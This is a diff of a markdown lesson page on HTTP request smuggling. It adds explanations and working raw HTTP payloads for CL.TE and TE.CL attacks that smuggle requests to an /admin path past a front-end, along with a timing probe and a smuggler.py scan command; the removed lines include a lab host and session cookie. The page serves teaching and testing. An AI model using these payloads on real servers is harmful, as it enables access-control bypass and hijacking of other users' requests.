@@ -1,105 +1,90 @@
-# HTTP request smuggling
+---
+title: "HTTP Request Smuggling"
+topic: "http-request-smuggling"
+tags: [http, request-smuggling, transfer-encoding, content-length, web-security, proxy]
+difficulty: advanced
+day: 53
+layout: default
+parent: Topics
+nav_order: 53
+---
 
-This vulnerability Usually Occurs due to disparity between two nodes and and the intended recipient of the HTTP request parses the request it is not supposed to or it does it in a way it is doesnt intend to. This way a request can be smuggled sometimes bypassing checks and sometimes dirupting services.
+# HTTP Request Smuggling
 
+## What You Will Learn
+- What HTTP request smuggling is and why it happens
+- How Content-Length and Transfer-Encoding headers conflict
+- How CL.TE and TE.CL attacks work with real examples
+- How to detect and test for request smuggling
 
-Two Important Header to Take Note Of:
+## What Is It?
 
-- Content-Length
-- Transfer-Encoding
+HTTP request smuggling occurs due to a discrepancy between how two nodes (front-end and back-end) parse the same HTTP request. When a request is parsed differently by each node, an attacker can "smuggle" an additional request that the front-end does not see but the back-end processes.
 
-### TE (Transfer Encoding)
+Two important headers are involved:
+- **Content-Length**: Specifies the exact byte size of the request body
+- **Transfer-Encoding**: Uses chunked encoding — body is sent in chunks with sizes prefixed in hex
 
-After sending the headers and the Transfer-Encoding: chunked declaration, the server sends the response body in a series of chunks. Each chunk begins with the size of the chunk, in hexadecimal, followed by a CRLF (Carriage Return and Line Feed) sequence.
-Then comes the chunk data, followed by another CRLF. Here's an example of what a chunk might look like:
+## Why It Matters
+
+Request smuggling can:
+- Bypass front-end security controls (WAF, access control)
+- Poison the back-end request queue to hijack other users' requests
+- Capture credentials or session tokens from other users
+
+## Transfer Encoding (Chunked)
+
+In chunked transfer encoding, the body is sent as a series of chunks. Each chunk starts with its size in hexadecimal, followed by CRLF, then the data:
+
 ```
 4\r\n
 This\r\n
 7\r\n
-is a test\r\n
+is test\r\n
 0\r\n
 \r\n
-
 ```
 
- The final chunk has a size of 0, which indicates the end of the response. The client understands that the response is complete when it receives a chunk with a size of 0.
+The final chunk has a size of 0, indicating the end.
 
+## CASE 1: CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
 
-CASE 1:
+The front-end counts bytes using Content-Length. The back-end expects chunked encoding.
 
-Between Two nodes , First node refers to Front End Node and the Second Node refers to Back End Node 
-
-If the First Node uses Content Type and the Second Node doesn't but supports Transfer Encoding ... An attacker can abuse this behavior to smuggle an additional request the first Node wont account for , but the second node will accept and parse.
-
-```
+```http
 POST / HTTP/1.1
-Host: Host
-Sec-Ch-Ua: 
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: ""
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
+Host: example.com
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 32
 Transfer-Encoding: chunked
 
 0
 
-GET /404 HTTP/1.1
-Ola: Ola
+GET /admin HTTP/1.1
+X-Injected: header
 ```
 
-in situation this request was used , the First Node will see a POST request with 
+The front-end sees a POST request with 32 bytes of body (including the `0\r\n\r\nGET /admin...` part). It forwards the whole thing.
 
-```
-0
+The back-end, using chunked encoding, sees:
+1. A POST request that ends at the `0` chunk
+2. A second request: `GET /admin HTTP/1.1`
 
-GET /404 HTTP/1.1
-Ola: Ola
-```
-as body because it uses the Content-Type header to parse the request, this allows ``` GET /404 HTTP/1.1
-Ola: Ola``` to go unchallenged by the first node , but once it gets to the second node which uses *Transfer-Encoding* it sees two request instead one a post request that uses a chunk and ends without a body and a second request ```GET /404 HTTP/1.1
-Ola: Ola``` ... This way both request will be processed and if there are any checks in the first node , it has been bypassed
+The `GET /admin` request bypasses any front-end checks.
 
+## CASE 2: TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
 
+The front-end parses chunked encoding. The back-end counts bytes using Content-Length.
 
-
-
-CASE 2:
-
-In this scenario , the First Node uses the Transfer0-Encoding Header and the Second Node uses the Content-Type Header for parsing the request. A scenario like this an attacker can make the second node parse an additional request by fooling the front-end to believe it is only parsing one .
-
-```
+```http
 POST / HTTP/1.1
-Host: 0a87003a03245d6a8163d66b00f9003f.web-security-academy.net
-Cookie: session=yiwWx1zD5MkhYVAOBOwsyX4tCRJO0GX7
-Cache-Control: max-age=0
-Sec-Ch-Ua: 
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: ""
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
+Host: target.com
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 4
 Transfer-Encoding: chunked
 
 5e
-POST /404 HTTP/1.1
+POST /admin HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
@@ -109,16 +94,52 @@ x=1
 
 ```
 
-The First Node using Transfer-Encoding two chunks of data, the first chunk with a lenght of 97 bytes (0x5e). and the second chunk signifying the end of the request. This request passed the first node checks nothing spoil. The second node , seeing this same request interprets it diffrently , it sees a content-lenght of 4 bytes which is ```5e\r\n```  , and another request, a POST request with the content-lenght of 15, 
+The front-end, using Transfer-Encoding, sees two chunks: one with 0x5e (94) bytes and a terminating `0`. It forwards the whole request.
 
-```
-POST /404 HTTP/1.1
+The back-end, using Content-Length of 4, reads `5e\r\n` as the body and sees the rest as a second request:
+
+```http
+POST /admin HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
 x=1
-0
+```
 
-``` 
+This second request bypasses any front-end restriction on `/admin`.
 
+## Detection
 
+```bash
+# Use Burp Suite's HTTP Request Smuggler extension
+# Or manually test with timing — a CL.TE payload causes a delay on the back-end
+
+# Timing test for CL.TE
+POST / HTTP/1.1
+Transfer-Encoding: chunked
+Content-Length: 6
+
+3
+abc
+X
+```
+
+If the request times out (10+ seconds), the back-end is waiting for more data — indicating TE support.
+
+## Tools
+
+```bash
+# Burp Suite — HTTP Request Smuggler extension by James Kettle
+# smuggler.py — automated smuggling detection tool
+python3 smuggler.py -u https://target.com/
+
+# HTTP/2 downgrade smuggling
+# h2smuggler — HTTP/2 to HTTP/1.1 smuggling tool
+```
+
+## Resources
+
+- [PortSwigger — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
+- [James Kettle — HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
+- [Smuggler Tool](https://github.com/defparam/smuggler)
+- [TryHackMe — HTTP Request Smuggling](https://tryhackme.com/)
